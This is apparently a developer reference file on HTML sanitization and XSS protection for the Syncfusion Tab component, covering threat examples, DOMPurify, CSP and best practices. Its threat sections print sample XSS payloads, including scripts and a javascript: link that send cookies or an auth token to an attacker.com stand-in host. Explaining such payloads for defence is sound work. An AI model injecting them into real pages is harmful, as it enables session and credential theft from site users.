---
name: security-html-sanitization
title: Security and HTML Sanitization
description: Security best practices and HTML sanitization for Tab component
---

# Security and HTML Sanitization

## Overview

The Syncfusion Tab component provides built-in HTML sanitization through the `enableHtmlSanitizer` property to protect against Cross-Site Scripting (XSS) attacks when rendering untrusted HTML content.

## HTML Sanitization Basics

### What is HTML Sanitization?

HTML sanitization removes potentially malicious code (scripts, event handlers, dangerous attributes) from HTML strings before rendering them in the DOM. This prevents:

- **XSS (Cross-Site Scripting)** attacks
- **Stored XSS** from user-generated content
- **Reflected XSS** through URL parameters
- **DOM-based XSS** from JavaScript execution

### The enableHtmlSanitizer Property

```typescript
let tabObj: Tab = new Tab({
    enableHtmlSanitizer: true,  // Default: enables sanitization
    items: [...]
});
```

| Setting | Behavior | Use Case |
|---------|----------|----------|
| `true` (default) | Strips malicious HTML/scripts | **User-generated content, dynamic content, forms** |
| `false` | Renders HTML as-is | Developer content only, no user input |

---

## Threat Examples and Protection

### Threat 1: Script Tag Injection

**Malicious Input:**
```html
<p>Hello user</p>
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**With `enableHtmlSanitizer: true` (SAFE):**
```html
<!-- Script tag is completely removed -->
<p>Hello user</p>
```

**With `enableHtmlSanitizer: false` (DANGEROUS):**
```html
<!-- Script executes and steals cookies -->
<p>Hello user</p>
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### Threat 2: Event Handler Injection

**Malicious Input:**
```html
<img src="x" onerror="alert('You are hacked'); fetch('https://attacker.com')" />
<div onmouseover="window.location='https://phishing.com'">Hover me</div>
<button onclick="deleteAllData()">Click me</button>
```

**With Sanitization:**
```html
<!-- All event handlers removed -->
<img src="x" />
<div>Hover me</div>
<button>Click me</button>
```

### Threat 3: Malicious Href/Src

**Malicious Input:**
```html
<a href="javascript:void(0);fetch('https://attacker.com/steal?data=' + localStorage.getItem('authToken'))">
    Click here
</a>
<iframe src="javascript:alert('Frame XSS')"></iframe>
```

**With Sanitization:**
```html
<!-- JavaScript protocols removed -->
<a>Click here</a>
<!-- Iframe src removed -->
<iframe></iframe>
```

### Threat 4: SVG Script Injection

**Malicious Input:**
```html
<svg onload="alert('SVG XSS')">
    <script>console.log('SVG Script')</script>
</svg>
```

**With Sanitization:**
```html
<!-- onload handler and script removed -->
<svg></svg>
```

---

## Implementation Patterns

### Pattern 1: User-Generated Content (Secure Default)

Used when rendering content from users, forms, or external sources.

```typescript
interface BlogPost {
    title: string;
    htmlContent: string;  // From user input/markdown processor
}

function createBlogPostTabs(posts: BlogPost[]) {
    let tabItems = posts.map(post => ({
        header: { text: post.title },
        content: post.htmlContent  // Potentially untrusted
    }));
    
    // SECURE: Sanitization ENABLED (default)
    let blogTabs = new Tab({
        enableHtmlSanitizer: true,  // Explicitly safe
        items: tabItems
    });
    
    return blogTabs;
}

// Example
let blogPosts: BlogPost[] = [
    {
        title: 'My Post',
        htmlContent: `
            <p>This is my post</p>
            <script>alert('hack')</script>  <!-- Will be removed -->
        `
    }
];

createBlogPostTabs(blogPosts).appendTo('#blogs');
```

### Pattern 2: Developer Content (Pre-verified)

Used for developer-written HTML that doesn't come from users.

```typescript
// DEVELOPER-CONTROLLED content only
let appTabs = new Tab({
    // Can disable if content is 100% developer-controlled
    enableHtmlSanitizer: false,
    items: [
        {
            header: { text: 'Dashboard' },
            content: `
                <div class="dashboard">
                    <h2>Welcome</h2>
                    <p>This is developer content with custom scripts</p>
                    <script src="/my-scripts/dashboard.js"></script>
                </div>
            `
        }
    ]
});

appTabs.appendTo('#dashboard');
```

### Pattern 3: Mixed Content (Conservative Approach)

When some tabs have user content and some have developer content.

```typescript
interface TabData {
    header: string;
    contentFromUser?: string;
    contentFromDeveloper?: string;
    isUserGenerated: boolean;
}

function createMixedTabs(tabData: TabData[]) {
    let tabs = tabData.map(tab => ({
        header: { text: tab.header },
        // Use user content if available (might be malicious)
        content: tab.contentFromUser || tab.contentFromDeveloper,
        // Flag it as user content for security policy
        cssClass: tab.isUserGenerated ? 'user-generated-tab' : 'developer-tab'
    }));
    
    // SAFE: Always enable for any potential user content
    let mixedTabs = new Tab({
        enableHtmlSanitizer: true,
        items: tabs
    });
    
    return mixedTabs;
}
```

### Pattern 4: Content Sanitized Externally

Sanitize content before passing to Tab component using DOMPurify library.

```typescript
import { Tab } from '@syncfusion/ej2-navigations';
import DOMPurify from 'dompurify';

interface SafeContent {
    header: string;
    content: string;  // Already sanitized
}

function createSafeContent(userInput: string): SafeContent[] {
    return [{
        header: 'User Content',
        // Sanitize explicitly with DOMPurify
        content: DOMPurify.sanitize(userInput, {
            ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'b', 'i', 'u'],
            ALLOWED_ATTR: ['class', 'style']
        })
    }];
}

// Create tabs with pre-sanitized content
let tabObj = new Tab({
    enableHtmlSanitizer: true,  // Double protection
    items: createSafeContent(userJsonData)
});

tabObj.appendTo('#element');
```

### Pattern 5: Plain Text for Untrusted Input

Safest approach: Convert to plain text instead of HTML.

```typescript
function escapeHtml(text: string): string {
    const map: { [key: string]: string } = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

function createPlainTextTab(userText: string) {
    return new Tab({
        items: [{
            header: { text: 'User Content' },
            // No HTML interpretation - safest approach
            content: `<pre>${escapeHtml(userText)}</pre>`
        }]
    });
}

// Usage
let userComment = '<script>alert("xss")</script>';
createPlainTextTab(userComment).appendTo('#comments');
// Renders: <pre>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</pre>
```

### Pattern 6: Content Security Policy (CSP) Integration

Use Content Security Policy headers with Tab sanitization for defense-in-depth.

```typescript
// HTML Meta Tag
// <meta http-equiv="Content-Security-Policy" 
//       content="script-src 'self' 'unsafe-inline'; object-src 'none'">

// Or via HTTP Header (recommended)
// Content-Security-Policy: script-src 'self'; object-src 'none';

let tabObj = new Tab({
    enableHtmlSanitizer: true,  // Sanitize content
    items: [
        {
            header: { text: 'External Content' },
            content: '<iframe src="https://trusted-domain.com/embed"></iframe>'
        }
    ]
});

tabObj.appendTo('#element');
```

---

## Sanitization Whitelist/Blacklist

The default Syncfusion sanitizer removes:

### Removed Elements
- `<script>`, `<style>`, `<iframe>`
- Event handler attributes
- Dangerous protocols

### Removed Attributes
| Attribute | Reason |
|-----------|--------|
| `on*` (onclick, onerror, etc.) | Event handlers can execute scripts |
| `href="javascript:..."` | JavaScript protocol execution |
| `src="javascript:..."` | JavaScript protocol execution |
| `style="..."` (some cases) | Can trigger XSS via CSS expressions |
| `data` attributes (on dangerous elements) | Can bypass filters |

### Allowed Elements (typical)
- `<p>`, `<div>`, `<span>`
- `<h1>` to `<h6>`
- `<strong>`, `<em>`, `<b>`, `<i>`
- `<a>` (with safe href)
- `<img>` (with safe src)
- `<ul>`, `<ol>`, `<li>`
- `<table>`, `<tr>`, `<td>`, `<th>`
- `<br>`, `<hr>`

### Allowed Attributes (typical)
- `class`, `id`
- `href` (non-javascript)
- `src` (non-javascript)
- `alt`, `title`
- `width`, `height`

---

## Security Best Practices

### 1. **Always Enable for User Content**

```typescript
// ✅ GOOD
let userTabs = new Tab({
    enableHtmlSanitizer: true,  // Explicit
    items: loadUserProvidedTabs()
});

// ❌ BAD - Forgot to set enableHtmlSanitizer
let userTabs = new Tab({
    items: loadUserProvidedTabs()
});
```

### 2. **Validate and Sanitize at Source**

```typescript
// ✅ GOOD - Validate before storing
async function saveUserComment(comment: string) {
    // Validate length
    if (comment.length > 5000) {
        throw new Error('Comment too long');
    }
    
    // Pre-sanitize
    let cleaned = DOMPurify.sanitize(comment);
    
    // Save to database
    await fetch('/api/comments', {
        method: 'POST',
        body: JSON.stringify({ content: cleaned })
    });
}

// ❌ BAD - Save raw user input
async function saveUserComment(comment: string) {
    await fetch('/api/comments', {
        method: 'POST',
        body: JSON.stringify({ content: comment })  // Direct, unsanitized
    });
}
```

### 3. **Use Content Security Policy (CSP)**

```
<!-- In <head> -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' 'unsafe-inline'; 
               style-src 'self' 'unsafe-inline'; 
               object-src 'none';">
```

### 4. **Principle of Least Privilege**

```typescript
// Only allow what's needed
import DOMPurify from 'dompurify';

let config = {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'br', 'a'],  // Minimal tags
    ALLOWED_ATTR: ['href'],                           // Minimal attributes
    ALLOW_DATA_ATTR: false                            // No data attributes
};

let sanitized = DOMPurify.sanitize(userContent, config);

let tabObj = new Tab({
    enableHtmlSanitizer: true,
    items: [{
        header: { text: 'Limited Content' },
        content: sanitized
    }]
});
```

### 5. **Monitor and Audit**

```typescript
let tabObj = new Tab({
    enableHtmlSanitizer: true,
    items: [...]
});

// Log potential XSS attempts
tabObj.element?.addEventListener('DOMNodeInserted', (event) => {
    if (event.target instanceof HTMLElement) {
        let element = event.target;
        // Check for suspicious elements
        if (element.tagName === 'SCRIPT' || 
            ['onclick', 'onerror', 'onload'].some(attr => element.hasAttribute(attr))) {
            console.warn('Potential XSS attempt blocked:', element);
            // Report to security monitoring
            reportSecurityIncident({
                type: 'XSS_ATTEMPT',
                element: element.outerHTML,
                timestamp: new Date()
            });
        }
    }
});
```

### 6. **Regular Security Updates**

```typescript
// Keep Syncfusion libraries updated
// npm update @syncfusion/ej2-navigations

// Check for known vulnerabilities
// npm audit
// npm audit fix

// Monitor security advisories
// npm advisory security
```

---

## Comparison: Security Options

| Approach | Security | Flexibility | Use When |
|----------|----------|-------------|----------|
| `enableHtmlSanitizer: true` (default) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | User content, dynamic content |
| DOMPurify + Tab sanitizer | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Strict control needed |
| Plain text (text-only) | ⭐⭐⭐⭐⭐ | ⭐ | Maximum security |
| `enableHtmlSanitizer: false` | ⭐ | ⭐⭐⭐⭐⭐ | Developer content only |

---

## Common Issues and Solutions

### Issue 1: Sanitizer Removes Legitimate Content

**Problem:**
```typescript
// Legitimate SVG or styles get removed
let tab = new Tab({
    enableHtmlSanitizer: true,
    items: [{
        header: { text: 'Chart' },
        content: `<svg>...</svg>`  // Gets removed
    }]
});
```

**Solution: Use configuration**
```typescript
// Use pre-sanitized content with specific config
import DOMPurify from 'dompurify';

let config = {
    ALLOWED_TAGS: ['svg', 'rect', 'circle', 'path', ...],
    ALLOWED_ATTR: ['d', 'cx', 'cy', 'r', 'viewBox', ...]
};

let tab = new Tab({
    enableHtmlSanitizer: true,
    items: [{
        header: { text: 'Chart' },
        content: DOMPurify.sanitize(svgContent, config)
    }]
});
```

### Issue 2: Performance with Large Content

**Problem:** Sanitizing large HTML is slow

```typescript
// Slow for large documents
let tab = new Tab({
    enableHtmlSanitizer: true,
    items: [{
        content: veryLargeHtmlDocument  // Sanitization takes time
    }]
});
```

**Solution: Lazy load with on-demand sanitization**
```typescript
let tab = new Tab({
    loadOn: 'Demand',  // Load only when tab selected
    enableHtmlSanitizer: true,
    items: [{
        content: veryLargeHtmlDocument
    }]
});

tab.selected = () => {
    // Content sanitization happens only when tab is viewed
    console.log('Content loaded and sanitized');
};
```

### Issue 3: Certain HTML5 Features Blocked

**Problem:** HTML5 validity features like `required` get stripped

```typescript
// Form validation attributes might get removed
let tab = new Tab({
    enableHtmlSanitizer: true,
    items: [{
        content: `<input type="email" required />` // 'required' removed
    }]
});
```

**Solution: Pre-build sanitized content**
```typescript
function buildSafeForm() {
    let form = document.createElement('form');
    let input = document.createElement('input');
    input.type = 'email';
    input.required = true;  // Set via DOM, not HTML string
    form.appendChild(input);
    return form;
}

let tab = new Tab({
    enableHtmlSanitizer: true,
    items: [{
        content: buildSafeForm().outerHTML
    }]
});
```

---

## Related Documentation

- [Event Handling](./event-handling-reference.md) - Monitor security in events
- [API Properties Reference](./api-properties-reference.md) - `enableHtmlSanitizer` property
- [Advanced Features](./advanced-features.md) - Dynamic content patterns
- [Security advisories](https://www.syncfusion.com/security/vulnerabilities-fixed) - Syncfusion Security page

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-Based XSS](https://owasp.org/www-community/attacks/DOM_based_XSS)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)  
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

